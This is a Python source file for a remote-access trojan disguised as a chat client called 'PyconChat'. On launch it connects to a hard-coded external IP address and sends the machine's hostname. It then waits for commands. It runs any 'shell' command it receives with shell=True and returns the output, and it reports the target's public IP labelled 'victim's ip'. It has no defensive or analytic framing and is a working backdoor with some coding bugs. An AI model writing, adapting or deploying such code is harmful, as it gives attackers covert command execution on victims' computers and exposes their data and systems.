import socket
import threading
import pickle
import os
import requests
import subprocess
from time import sleep

state = {}
pcname = socket.gethostname()

def shell(serverSocket, command: str):

    def shell():
        output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        return output

    shel = threading.Thread(target=shell)
    shel._running = True
    shel.start()
    sleep(1)
    shel._running = False

    result = str(shell().stdout.decode('CP437'))
    numb = len(result)

    if result != "":
        if numb < 1:
            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes("unrecognized command or no output was obtained", "utf-8"))

        elif numb > 1990:
            f1 = open("output.txt", 'a')
            f1.write(result)
            f1.close()

            f1 = open("output.txt", 'a')
            for line in f1:
                file = file + line
                print(line)

            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes("Command successfully executed" + file, "utf-8"))

            os.remove("output.txt")
        else:
            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes(f"Command successfully executed:\\n```\\n{result}```", "utf-8"))
    else:
        serverSocket.send(b"/messageSend")
        serverSocket.send(bytes("unrecognized command or no output was obtained", "utf-8"))


def serverListen(serverSocket):
    while True:
        msg = serverSocket.recv(1024).decode("utf-8")
        if msg == "getIP":
            url = 'http://myexternalip.com/raw'
            r = requests.get(url)
            ip = r.text
            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes("victim's ip: " + ip, "utf-8"))

        elif "shell" in msg:
            command = msg.replace("shell", "")
            print(command)
            shell(serverSocket, command)

        elif msg == "blockinput":

            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes("Succesfully blocked!", "utf-8"))

        elif msg == "unblockinput":

            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes("Succesfully unblocked!", "utf-8"))

        else:
            print(msg)








def main():

    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.connect(("139.144.79.212", 8000))
    state["inputCondition"] = threading.Condition()
    state["sendMessageLock"] = threading.Lock()
    state["username"] = pcname
    state["groupname"] = pcname + "' " + "session"
    state["alive"] = False
    state["joinDisconnect"] = False
    state["inputMessage"] = True
    serverSocket.send(bytes(state["username"], "utf-8"))
    serverSocket.recv(1024)
    serverSocket.send(bytes(state["groupname"], "utf-8"))
    response = serverSocket.recv(1024).decode("utf-8")
    if response == "/adminReady":
        print("You have created the group", state["groupname"], "and are now an admin.")
        state["alive"] = True
    elif response == "/ready":
        print("You have joined the group", state["groupname"])
        state["alive"] = True

    serverListenThread = threading.Thread(target=serverListen, args=(serverSocket,))

    while True:
        if state["alive"] or state["joinDisconnect"]:
            break
    if state["alive"]:



        serverListenThread.start()
    while True:
        if state["joinDisconnect"]:
            serverSocket.shutdown(socket.SHUT_RDWR)
            serverSocket.close()


            print("Disconnected from PyconChat.")
            break
        elif not state["alive"]:
            serverSocket.shutdown(socket.SHUT_RDWR)
            serverSocket.close()

            serverListenThread.join()
            print("Disconnected from PyconChat.")
            break


if __name__ == "__main__":
    main()
